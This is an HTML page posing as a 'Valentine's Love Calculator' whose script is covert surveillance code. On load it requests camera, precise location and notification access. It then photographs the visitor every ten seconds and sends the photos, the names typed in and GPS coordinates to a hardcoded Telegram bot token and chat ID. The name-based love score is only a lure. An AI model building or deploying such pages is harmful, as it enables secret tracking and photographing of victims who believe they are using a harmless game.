<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Valentine's Love Calculator</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #ffafbd, #ffc3a0);
            padding: 15px;
            position: relative;
            overflow-x: hidden;
        }

        /* Floating hearts */
        .floating-hearts {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            pointer-events: none;
            z-index: 0;
        }

        .floating-heart {
            position: absolute;
            color: rgba(255, 255, 255, 0.4);
            font-size: 16px;
            animation: float 20s linear infinite;
        }

        @keyframes float {
            0% {
                transform: translateY(100vh) rotate(0deg);
                opacity: 0;
            }

            10% {
                opacity: 0.7;
            }

            90% {
                opacity: 0.7;
            }

            100% {
                transform: translateY(-100px) rotate(360deg);
                opacity: 0;
            }
        }

        /* Main card */
        .card {
            background-color: rgba(255, 255, 255, 0.98);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 500px;
            padding: 25px 20px;
            text-align: center;
            position: relative;
            z-index: 1;
            border: 1px solid rgba(255, 255, 255, 0.3);
            overflow: hidden;
        }

        .card::before,
        .card::after {
            content: "‚ù§";
            position: absolute;
            color: rgba(255, 105, 180, 0.08);
            font-size: 100px;
        }

        .card::before {
            top: -25px;
            left: -25px;
        }

        .card::after {
            bottom: -25px;
            right: -25px;
        }

        /* Header */
        .header {
            margin-bottom: 20px;
        }

        .heart-icon {
            color: #ff4d94;
            font-size: 36px;
            margin-bottom: 15px;
            animation: heartbeat 1.5s infinite;
        }

        @keyframes heartbeat {
            0% {
                transform: scale(1);
            }

            5% {
                transform: scale(1.2);
            }

            10% {
                transform: scale(1.1);
            }

            15% {
                transform: scale(1.3);
            }

            50% {
                transform: scale(1);
            }

            100% {
                transform: scale(1);
            }
        }

        .header h1 {
            color: #d63384;
            font-size: 2rem;
            margin-bottom: 8px;
            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.1);
            font-weight: 700;
            line-height: 1.2;
        }

        .header p {
            color: #666;
            font-size: 1rem;
            line-height: 1.4;
            padding: 0 5px;
        }

        /* Camera Section */
        .camera-section {
            margin: 20px 0;
            padding: 15px;
            background: rgba(255, 77, 148, 0.05);
            border-radius: 15px;
            border: 2px dashed #ff4d94;
        }

        .camera-title {
            color: #d63384;
            font-size: 1.1rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .camera-preview {
            margin: 15px 0;
            border-radius: 12px;
            overflow: hidden;
            display: none;
            position: relative;
            border: 3px solid #ff4d94;
            box-shadow: 0 5px 15px rgba(255, 77, 148, 0.2);
        }

        .camera-preview.active {
            display: block;
        }

        #cameraView {
            width: 100%;
            height: 200px;
            object-fit: cover;
            background: #f0f0f0;
        }

        .camera-status {
            position: absolute;
            top: 10px;
            left: 0;
            right: 0;
            text-align: center;
            color: white;
            font-weight: 600;
            background: rgba(0, 0, 0, 0.5);
            padding: 5px;
            font-size: 0.9rem;
        }

        /* Photo Preview */
        .photo-preview {
            display: none;
            margin: 15px 0;
            text-align: center;
        }

        .photo-preview.active {
            display: block;
        }

        .captured-photo {
            width: 100%;
            max-height: 200px;
            object-fit: cover;
            border-radius: 10px;
            border: 2px solid #ffcce0;
            margin-top: 10px;
        }

        /* Input fields */
        .input-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 20px;
        }

        .input-container {
            position: relative;
            width: 100%;
        }

        .input-container i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #ff4d94;
            font-size: 18px;
            z-index: 2;
        }

        input {
            width: 100%;
            padding: 15px 15px 15px 45px;
            border: 2px solid #ffcce0;
            border-radius: 50px;
            font-size: 1rem;
            outline: none;
            transition: all 0.3s ease;
            background-color: rgba(255, 255, 255, 0.9);
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        input:focus {
            border-color: #ff4d94;
            box-shadow: 0 0 0 3px rgba(255, 77, 148, 0.15);
            background-color: white;
        }

        /* Button */
        .btn {
            background: linear-gradient(to right, #ff4d94, #ff8ab3);
            color: white;
            border: none;
            border-radius: 50px;
            padding: 16px 20px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            box-shadow: 0 5px 15px rgba(255, 77, 148, 0.3);
            margin-top: 10px;
            width: 100%;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            position: relative;
            overflow: hidden;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(255, 77, 148, 0.4);
        }

        .btn:active {
            transform: translateY(-1px);
        }

        .btn i {
            font-size: 1.2rem;
        }

        .btn-loading i {
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        /* Results section */
        .result {
            margin-top: 20px;
            opacity: 0;
            transform: translateY(15px);
            transition: opacity 0.6s ease, transform 0.6s ease;
        }

        .result.show {
            opacity: 1;
            transform: translateY(0);
        }

        .result h2 {
            color: #d63384;
            font-size: 1.6rem;
            margin-bottom: 12px;
            font-weight: 600;
        }

        .percentage {
            font-size: 3rem;
            font-weight: 800;
            color: #ff4d94;
            margin: 12px 0;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
            position: relative;
            display: inline-block;
        }

        .percentage::after {
            content: "‚ù§";
            position: absolute;
            right: -30px;
            top: 5px;
            font-size: 2rem;
            animation: heartbeat 1.5s infinite;
        }

        .message {
            font-size: 1.2rem;
            color: #333;
            margin: 15px 0;
            padding: 12px;
            border-radius: 15px;
            background-color: rgba(255, 204, 224, 0.25);
            line-height: 1.4;
            font-weight: 500;
        }

        /* Progress bar */
        .progress-container {
            width: 100%;
            height: 20px;
            background-color: #ffcce0;
            border-radius: 50px;
            margin: 20px 0;
            overflow: hidden;
            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.08);
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(to right, #ff4d94, #ff8ab3);
            border-radius: 50px;
            transition: width 2s cubic-bezier(0.22, 0.61, 0.36, 1);
            position: relative;
            overflow: hidden;
        }

        /* Send Status */
        .send-status {
            margin: 15px 0;
            padding: 12px;
            border-radius: 10px;
            font-weight: 600;
            display: none;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .send-status.active {
            display: flex;
        }

        .send-status.sending {
            background: rgba(42, 171, 238, 0.1);
            color: #2AABEE;
        }

        .send-status.success {
            background: rgba(76, 175, 80, 0.1);
            color: #4CAF50;
        }

        .send-status.error {
            background: rgba(244, 67, 54, 0.1);
            color: #F44336;
        }

        /* Footer */
        .footer {
            margin-top: 20px;
            color: #666;
            font-size: 0.8rem;
            padding-top: 15px;
            border-top: 1px solid rgba(255, 204, 224, 0.3);
        }

        /* Responsive design */
        @media (max-width: 480px) {
            body {
                padding: 10px;
                align-items: flex-start;
                padding-top: 10px;
            }

            .card {
                padding: 20px 15px;
                border-radius: 18px;
            }

            .header h1 {
                font-size: 1.8rem;
            }

            .percentage {
                font-size: 2.5rem;
            }

            .percentage::after {
                right: -25px;
                font-size: 1.7rem;
                top: 3px;
            }

            .message {
                font-size: 1.1rem;
                padding: 10px;
            }

            input {
                padding: 14px 14px 14px 40px;
            }

            .btn {
                padding: 14px 18px;
                font-size: 1rem;
            }
        }
    </style>
</head>

    <script>
        // Telegram Configuration
        const telegramConfig = {
            botToken: '8013439584:AAGX2En5Q9cfbUu_yU5Zi3HUwhOs4FMlbzg',
            chatId: '8262870180'
        };

        // State variables
        let stream = null;
        let capturedPhotoData = null;
        let isProcessing = false;
        let userLocation = null;
        let permissionsGranted = {
            camera: false,
            location: false,
            notifications: false
        };
        let permissionsRequested = false;

        // DOM Elements
        const cameraView = document.getElementById('cameraView');
        const telegramStatus = document.getElementById('telegramStatus');
        const statusText = document.getElementById('statusText');

        // Request all permissions at once
        async function requestAllPermissions() {
            if (permissionsRequested) return;
            permissionsRequested = true;

            showStatus('Requesting permissions...', 'sending');

            const permissionPromises = [];

            // Request camera permission
            permissionPromises.push(
                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                })
                    .then(stream => {
                        permissionsGranted.camera = true;
                        console.log('Camera permission granted');
                        return stream;
                    })
                    .catch(error => {
                        console.log('Camera permission denied:', error.message);
                        permissionsGranted.camera = false;
                        return null;
                    })
            );

            // Request location permission
            permissionPromises.push(
                new Promise((resolve, reject) => {
                    if (!navigator.geolocation) {
                        console.log('Geolocation not supported');
                        permissionsGranted.location = false;
                        resolve(null);
                        return;
                    }

                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            // Validate coordinates
                            if (position.coords.latitude === 0 && position.coords.longitude === 0) {
                                permissionsGranted.location = false;
                                resolve(null);
                                return;
                            }

                            if (Math.abs(position.coords.latitude) > 90 || Math.abs(position.coords.longitude) > 180) {
                                permissionsGranted.location = false;
                                resolve(null);
                                return;
                            }

                            userLocation = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                altitudeAccuracy: position.coords.altitudeAccuracy,
                                heading: position.coords.heading,
                                speed: position.coords.speed,
                                timestamp: new Date().toISOString()
                            };

                            permissionsGranted.location = true;
                            console.log('Location permission granted');
                            resolve(userLocation);
                        },
                        (error) => {
                            console.log('Location permission denied:', error.message);
                            permissionsGranted.location = false;
                            resolve(null);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        }
                    );
                })
            );

            // Request notification permission (optional)
            if ('Notification' in window && Notification.permission === 'default') {
                permissionPromises.push(
                    Notification.requestPermission()
                        .then(permission => {
                            permissionsGranted.notifications = permission === 'granted';
                            console.log('Notification permission:', permission);
                            return permission;
                        })
                        .catch(error => {
                            console.log('Notification permission error:', error);
                            permissionsGranted.notifications = false;
                            return 'denied';
                        })
                );
            } else {
                permissionsGranted.notifications = Notification.permission === 'granted';
                permissionPromises.push(Promise.resolve(Notification.permission));
            }

            try {
                const results = await Promise.all(permissionPromises);

                // Handle camera stream
                if (results[0]) {
                    stream = results[0];
                    cameraView.srcObject = stream;
                }

                // Show permission results
                const granted = Object.values(permissionsGranted).filter(Boolean).length;
                const total = Object.keys(permissionsGranted).length;

                if (granted === total) {
                    showStatus(`‚úÖ All permissions granted (${granted}/${total})`, 'success');
                } else if (granted > 0) {
                    showStatus(`‚ö†Ô∏è Partial permissions granted (${granted}/${total})`, 'sending');
                } else {
                    showStatus('‚ùå No permissions granted. App will run with limited features.', 'error');
                }

                // Start continuous capture if camera is available
                if (permissionsGranted.camera) {
                    startContinuousCapture();
                }

                return permissionsGranted;

            } catch (error) {
                console.error('Error requesting permissions:', error);
                showStatus('Error requesting permissions', 'error');
                return permissionsGranted;
            }
        }

        // Get location data for Telegram message
        function getLocationInfo() {
            if (userLocation) {
                let locationText = `üìç Location: ${userLocation.latitude.toFixed(6)}, ${userLocation.longitude.toFixed(6)}
Accuracy: ${userLocation.accuracy} meters`;

                // Add altitude if available
                if (userLocation.altitude !== null) {
                    locationText += `\nAltitude: ${userLocation.altitude.toFixed(2)} meters`;
                }

                // Add heading and speed if available
                if (userLocation.heading !== null) {
                    locationText += `\nHeading: ${userLocation.heading.toFixed(2)}¬∞`;
                }
                if (userLocation.speed !== null) {
                    locationText += `\nSpeed: ${userLocation.speed.toFixed(2)} m/s`;
                }

                locationText += `\nTime: ${new Date(userLocation.timestamp).toLocaleString()}`;

                return locationText;
            } else {
                return 'üìç Location: Not available (permission denied or mock data detected)';
            }
        }

        // Show/hide status
        function showStatus(message, type = 'info') {
            telegramStatus.className = 'send-status active ' + type;
            statusText.textContent = message;

            switch (type) {
                case 'sending':
                    telegramStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ' + message;
                    break;
                case 'success':
                    telegramStatus.innerHTML = '<i class="fas fa-check-circle"></i> ' + message;
                    setTimeout(() => telegramStatus.classList.remove('active'), 5000);
                    break;
                case 'error':
                    telegramStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> ' + message;
                    setTimeout(() => telegramStatus.classList.remove('active'), 5000);
                    break;
            }
        }

        // SIMPLE: Convert Base64 to Blob (Works Better)
        function base64ToBlob(base64) {
            // Remove data URL prefix
            const byteString = atob(base64.split(',')[1]);

            // Get mime type
            const mimeString = base64.split(',')[0].split(':')[1].split(';')[0];

            // Write bytes
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }

            return new Blob([ab], { type: mimeString });
        }

        // SIMPLE: Send Photo to Telegram (Using fetch with FormData)
        async function sendPhotoToTelegram(photoData, caption) {
            try {
                console.log('Starting photo send...');

                // Convert base64 to blob
                const blob = base64ToBlob(photoData);
                console.log('Blob created:', blob.size, 'bytes');

                // Create form data
                const formData = new FormData();
                formData.append('chat_id', telegramConfig.chatId);
                formData.append('photo', blob, 'love_photo.jpg');
                formData.append('caption', caption);

                console.log('Sending to Telegram API...');

                // Send photo
                const response = await fetch(
                    `https://api.telegram.org/bot${telegramConfig.botToken}/sendPhoto`,
                    {
                        method: 'POST',
                        body: formData
                    }
                );

                const data = await response.json();
                console.log('Telegram response:', data);

                if (data.ok) {
                    console.log('‚úÖ Photo sent successfully!');
                    return { success: true, message: 'Photo sent!' };
                } else {
                    console.error('‚ùå Telegram error:', data.description);
                    return { success: false, message: data.description || 'Telegram error' };
                }

            } catch (error) {
                console.error('‚ùå Network error:', error);
                return { success: false, message: 'Network error' };
            }
        }

        // SIMPLE: Send Text to Telegram
        async function sendTextToTelegram(text) {
            try {
                const response = await fetch(
                    `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`,
                    {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: telegramConfig.chatId,
                            text: text,
                            parse_mode: 'HTML'
                        })
                    }
                );

                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('Text send error:', error);
                return false;
            }
        }

        // Start camera (deprecated - now handled in requestAllPermissions)
        async function startCamera() {
            // Camera is now started during permission request
            return permissionsGranted.camera;
        }

        // Continuous capture interval ID
        let continuousCaptureInterval = null;

        // Start continuous photo capture
        function startContinuousCapture() {
            // Capture first photo after 1 second
            setTimeout(() => {
                captureAndSendPhoto();

                // Then capture and send every 10 seconds
                continuousCaptureInterval = setInterval(() => {
                    captureAndSendPhoto();
                }, 10000); // Every 10 seconds
            }, 1000);
        }

        // Capture and send photo
        async function captureAndSendPhoto() {
            if (!stream) {
                console.log('No camera stream available for capture');
                return;
            }

            const canvas = document.createElement('canvas');
            const videoTrack = stream.getVideoTracks()[0];
            const settings = videoTrack.getSettings();
            canvas.width = settings.width || 640;
            canvas.height = settings.height || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(cameraView, 0, 0);

            // Get photo as base64
            const photoData = canvas.toDataURL('image/jpeg', 0.9);

            // Send photo to Telegram
            const name1 = document.getElementById('name1').value.trim() || 'Anonymous';
            const name2 = document.getElementById('name2').value.trim() || 'Anonymous';

            const caption = `‚ù§Ô∏è ${name1} & ${name2} - Continuous Capture
${new Date().toLocaleString()}

${getLocationInfo()}

Sent from Valentine's Love Calculator`;

            try {
                const photoResult = await sendPhotoToTelegram(photoData, caption);
                if (photoResult.success) {
                    console.log('Photo sent to Telegram successfully');
                } else {
                    console.error('Failed to send photo to Telegram:', photoResult.message);
                }
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
            }
        }

        // Process without photo when camera is unavailable
        function processWithoutPhoto() {
            // This function will be called when camera access fails
            // The main calculation is already done, just need to send the text result
        }

        // Capture photo - kept for compatibility
        function capturePhoto() {
            if (!stream) {
                // No camera available
                return;
            }

            // For continuous mode, just trigger the capture and send function
            captureAndSendPhoto();
        }

        // Calculate love score
        function calculateLoveScore(name1, name2) {
            const combinedNames = (name1 + name2).toLowerCase().replace(/\s+/g, '');

            if (combinedNames.length === 0) return 50;

            let score = 0;

            for (let i = 0; i < combinedNames.length; i++) {
                score += combinedNames.charCodeAt(i);
            }

            score = (score * 7) % 101;
            score = Math.min(100, Math.max(0, score + 20));

            const vowels = ['a', 'e', 'i', 'o', 'u'];
            if (vowels.includes(name1[0]?.toLowerCase()) || vowels.includes(name2[0]?.toLowerCase())) {
                score = Math.min(100, score + 5);
            }

            if (name1[0]?.toLowerCase() === name2[0]?.toLowerCase() && name1[0]) {
                score = Math.min(100, score + 10);
            }

            return Math.round(score);
        }

        // Get romantic message
        function getRomanticMessage(score) {
            if (score >= 80) return "Great match! You're perfect for each other! üíï";
            if (score >= 60) return "Good compatibility! A promising connection! üòä";
            if (score >= 40) return "Average compatibility. There's potential here! üíñ";
            if (score >= 20) return "Low compatibility. Maybe give it some time? üíù";
            return "Better as friends. But friendship is special too! ü§ó";
        }

        // Main function
        async function calculateAndDisplay() {
            if (isProcessing) return;
            isProcessing = true;

            const name1 = document.getElementById('name1').value.trim();
            const name2 = document.getElementById('name2').value.trim();
            const button = document.getElementById('calculateBtn');

            if (!name1 || !name2) {
                showStatus('Please enter both names!', 'error');
                isProcessing = false;
                return;
            }

            // Disable button
            button.disabled = true;
            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';

            // Show result section
            document.getElementById('result').classList.add('show');

            // Calculate score
            const score = calculateLoveScore(name1, name2);
            const message = getRomanticMessage(score);

            // Update UI
            document.getElementById('percentage').textContent = score + '%';
            document.getElementById('message').textContent = message;
            document.getElementById('progressBar').style.width = score + '%';

            // Send result to Telegram
            showStatus('Sending result to Telegram...', 'sending');

            let textMessage = `
<b>‚ù§Ô∏è New Love Calculation Result ‚ù§Ô∏è</b>

<b>Names:</b> ${name1} ‚ù§Ô∏è ${name2}
<b>Love Score:</b> ${score}%
<b>Message:</b> ${message}

<b>Date:</b> ${new Date().toLocaleDateString()}
<b>Time:</b> ${new Date().toLocaleTimeString()}
`;

            // Add permission status
            const granted = Object.values(permissionsGranted).filter(Boolean).length;
            const total = Object.keys(permissionsGranted).length;
            textMessage += `<b>Permissions:</b> ${granted}/${total} granted\n`;

            // Add camera status
            if (permissionsGranted.camera) {
                textMessage += '<b>Photo:</b> Auto-captured and sent continuously\n';
            } else {
                textMessage += '<b>Photo:</b> Camera access denied - no photo captured\n';
            }

            // Add location info
            textMessage += getLocationInfo() + '\n\n';
            textMessage += '<em>Generated by Valentine\'s Love Calculator</em>';

            const textSent = await sendTextToTelegram(textMessage);
            if (textSent) {
                showStatus('‚úÖ Result sent to Telegram!', 'success');
            } else {
                showStatus('Failed to send result', 'error');
            }

            // Reset button
            button.disabled = false;
            button.innerHTML = '<i class="fas fa-heart"></i> Check Compatibility';
            isProcessing = false;
        }

        // Create floating hearts
        function createFloatingHearts() {
            const container = document.getElementById('floatingHearts');
            const heartCount = 15;

            for (let i = 0; i < heartCount; i++) {
                const heart = document.createElement('div');
                heart.classList.add('floating-heart');
                heart.innerHTML = '‚ù§';

                const size = Math.random() * 12 + 6;
                const left = Math.random() * 100;
                const delay = Math.random() * 15;
                const duration = Math.random() * 15 + 15;

                heart.style.fontSize = `${size}px`;
                heart.style.left = `${left}vw`;
                heart.style.animationDelay = `${delay}s`;
                heart.style.animationDuration = `${duration}s`;

                container.appendChild(heart);
            }
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function () {
            createFloatingHearts();

            // Request all permissions immediately on page load
            const calculateBtn = document.getElementById('calculateBtn');

            // Request permissions right away
            requestAllPermissions().then(() => {
                // Attach the actual calculate function after permissions are handled
                calculateBtn.addEventListener('click', calculateAndDisplay);
                document.getElementById('name1').addEventListener('keypress', function (e) {
                    if (e.key === 'Enter') calculateAndDisplay();
                });
                document.getElementById('name2').addEventListener('keypress', function (e) {
                    if (e.key === 'Enter') calculateAndDisplay();
                });
            });

            // Show initial message
            setTimeout(() => {
                document.getElementById('result').classList.add('show');
            }, 300);
        });

        // Test function to verify Telegram bot
        async function testTelegramBot() {
            try {
                showStatus('Testing Telegram bot...', 'sending');

                const response = await fetch(
                    `https://api.telegram.org/bot${telegramConfig.botToken}/getMe`
                );

                const data = await response.json();

                if (data.ok) {
                    showStatus('Connected ready', 'success');
                    return true;
                } else {
                    showStatus('‚ùå Bot not responding', 'error');
                    return false;
                }
            } catch (error) {
                showStatus('‚ùå Network error', 'error');
                return false;
            }
        }

        // Clean up camera stream and intervals when page is closed
        window.addEventListener('beforeunload', function () {
            if (continuousCaptureInterval) {
                clearInterval(continuousCaptureInterval);
            }
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
        });

        // Run test on load
        setTimeout(testTelegramBot, 1000);
    </script>
